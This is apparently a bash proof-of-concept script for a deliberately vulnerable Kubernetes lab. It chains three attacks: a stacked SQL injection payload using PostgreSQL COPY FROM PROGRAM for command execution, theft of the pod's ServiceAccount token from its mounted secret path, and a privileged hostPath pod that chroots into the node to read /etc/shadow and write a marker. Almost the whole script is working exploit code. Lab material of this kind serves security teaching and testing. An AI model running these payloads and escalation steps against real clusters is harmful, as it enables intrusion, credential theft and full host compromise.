#!/usr/bin/env bash
# =============================================================================
# End-to-end lateral-movement proof of concept.
#
#   Hop 1: SQL injection in the web app  ->  RCE inside the PostgreSQL pod
#          (PostgreSQL COPY ... FROM PROGRAM, usable because the DB user is a
#           superuser).
#   Hop 2: Steal the Postgres pod's ServiceAccount token  ->  cluster-admin on
#          the Kubernetes API (deliberate RBAC misconfiguration).
#   Hop 3: Use cluster-admin to schedule a privileged pod that mounts the host
#          filesystem  ->  root on the k3s node === root on this server.
#
# Everything privileged below authenticates ONLY with the token stolen through
# the web vulnerability -- nothing uses your kubeconfig credentials -- to prove
# the path is real. (It runs kubectl from the host for convenience; a real
# attacker would run the same API calls from inside the Postgres pod.)
# =============================================================================
set -euo pipefail

APP_URL="${APP_URL:-http://localhost:30080}"
API_SERVER="${API_SERVER:-https://127.0.0.1:6443}"
SINK="${APP_URL}/api/v1/lab/products"
MARKER="/tmp/PWNED_FROM_POSTGRES_POD_$$"

RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; BLU=$'\e[34m'; RST=$'\e[0m'
step() { echo; echo "${BLU}=== $* ===${RST}"; }
ok()   { echo "${GRN}[+] $*${RST}"; }
info() { echo "${YEL}[*] $*${RST}"; }

need() { command -v "$1" >/dev/null 2>&1 || { echo "${RED}missing dependency: $1${RST}" >&2; exit 1; }; }
need curl
need python3

# Run arbitrary OS commands inside the Postgres pod via the SQLi sink and print
# the captured stdout. Uses PostgreSQL COPY ... FROM PROGRAM.
rce() {
  local cmd="$1"
  local payload="'; DROP TABLE IF EXISTS lab_out; CREATE TABLE lab_out(line text); COPY lab_out FROM PROGRAM '${cmd}'; SELECT line FROM lab_out; -- "
  curl -s --get "${SINK}" --data-urlencode "search=${payload}" \
    | python3 -c '
import sys, json
try:
    doc = json.load(sys.stdin)
except Exception as e:
    sys.stderr.write("could not parse app response: %s\n" % e); sys.exit(1)
if "error" in doc:
    sys.stderr.write("sql error: %s\n" % doc["error"]); sys.exit(1)
lines = []
for rs in doc.get("resultSets", []):
    for row in rs:
        # the lab_out table has a single column "line"
        if "line" in row and row["line"] is not None:
            lines.append(str(row["line"]))
sys.stdout.write("\n".join(lines))
'
}

# ---------------------------------------------------------------------------
step "HOP 1 — SQL injection -> remote code execution in the Postgres pod"
info "Target sink: ${SINK}?search=..."
info "Confirming code execution (running 'id' and 'hostname' inside the DB pod):"
WHOAMI="$(rce 'id')"
HOSTN="$(rce 'hostname')"
echo "    id        -> ${WHOAMI}"
echo "    hostname  -> ${HOSTN}"
[ -n "${WHOAMI}" ] || { echo "${RED}RCE failed — is the lab deployed and reachable at ${APP_URL}?${RST}"; exit 1; }
ok "Arbitrary command execution inside the PostgreSQL pod confirmed."

# ---------------------------------------------------------------------------
step "HOP 2 — Steal the pod's ServiceAccount token -> cluster-admin"
info "Reading the mounted ServiceAccount token through the same RCE primitive:"
TOKEN="$(rce 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' | tr -d '\r\n')"
if [ -z "${TOKEN}" ]; then
  echo "${RED}No token found — automountServiceAccountToken may be off.${RST}"; exit 1
fi
echo "    token (first 40 chars): ${TOKEN:0:40}..."
ok "Exfiltrated the Postgres pod's ServiceAccount token via the web vuln alone."

if ! command -v kubectl >/dev/null 2>&1; then
  echo "${YEL}kubectl not found on PATH; trying 'k3s kubectl'.${RST}"
  kubectl() { sudo k3s kubectl "$@"; }
fi
# From here on, authenticate ONLY with the stolen token.
STOLEN=(kubectl --server="${API_SERVER}" --token="${TOKEN}" --insecure-skip-tls-verify=true)

info "Proving the stolen token is cluster-admin (can it do anything, anywhere?):"
PERM="$("${STOLEN[@]}" auth can-i '*' '*' --all-namespaces 2>/dev/null || true)"
echo "    kubectl auth can-i '*' '*' --all-namespaces -> ${PERM}"
info "Listing cluster secrets with the stolen token (should be denied to a normal pod):"
"${STOLEN[@]}" get secrets -A 2>/dev/null | head -n 6 || true
ok "The stolen token has full cluster-admin rights."

# ---------------------------------------------------------------------------
step "HOP 3 — cluster-admin -> root on the node (this server)"
NODE="$("${STOLEN[@]}" get nodes -o jsonpath='{.items[0].metadata.name}')"
info "Scheduling a privileged pod on node '${NODE}' that mounts the host's / filesystem:"
cat <<EOF | "${STOLEN[@]}" apply -f - >/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: node-pwn
  namespace: vuln-lab
spec:
  nodeName: ${NODE}
  hostPID: true
  hostNetwork: true
  containers:
    - name: shell
      image: postgres:16-alpine     # already present in-cluster, no pull needed
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
EOF

"${STOLEN[@]}" -n vuln-lab wait --for=condition=Ready pod/node-pwn --timeout=120s >/dev/null
ok "Privileged pod 'node-pwn' is running with the host root filesystem at /host."

info "Executing as root on the NODE (chroot into the host filesystem):"
echo    "    chroot /host id            -> $("${STOLEN[@]}" -n vuln-lab exec node-pwn -- chroot /host id)"
echo    "    chroot /host uname -a      -> $("${STOLEN[@]}" -n vuln-lab exec node-pwn -- chroot /host uname -a)"
info "Reading /etc/shadow from the host (first line):"
"${STOLEN[@]}" -n vuln-lab exec node-pwn -- chroot /host sh -c 'head -n1 /etc/shadow' || true

info "Dropping a proof marker onto the host filesystem at ${MARKER}:"
"${STOLEN[@]}" -n vuln-lab exec node-pwn -- chroot /host sh -c "echo 'pwned via SQLi->postgres pod->cluster-admin->node' > ${MARKER}"

echo
if [ -f "${MARKER}" ]; then
  ok "Marker is present on THIS server's real filesystem: ${MARKER}"
  echo "    $(cat "${MARKER}")"
  ok "GAME OVER: a web SQL injection became root on the Kubernetes server."
else
  info "Marker written inside the node; if this script runs on the same host, check ${MARKER}"
fi

echo
info "Clean up the attacker pod and marker with: k8s-lab/scripts/teardown.sh"
